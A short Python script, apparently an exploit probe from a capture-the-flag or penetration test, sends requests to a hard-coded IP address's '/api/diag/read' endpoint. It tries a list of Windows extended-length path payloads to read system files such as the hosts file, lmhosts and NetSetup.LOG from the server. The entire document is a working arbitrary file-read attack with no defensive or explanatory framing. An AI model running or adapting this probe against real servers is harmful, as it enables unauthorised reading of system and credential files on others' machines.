import requests

BASE_URL = "http://1.95.51.2:8080"

def check_stage1(path):
    url = f"{BASE_URL}/api/diag/read"
    params = {"path": path}
    try:
        print(f"[*] Trying path: {path}")
        r = requests.get(url, params=params, timeout=5)
        print(f"[*] Status Code: {r.status_code}")
        print(f"[*] Response: {r.text[:300]}") 
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    payloads = [
        r"\\?\C:\Windows\System32\drivers\etc\hosts",
        r"\\?\C:\Windows\System32\drivers\etc\lmhosts",
        r"\\?\C:\Windows\debug\NetSetup.LOG",
    ]
    for p in payloads:
        check_stage1(p)
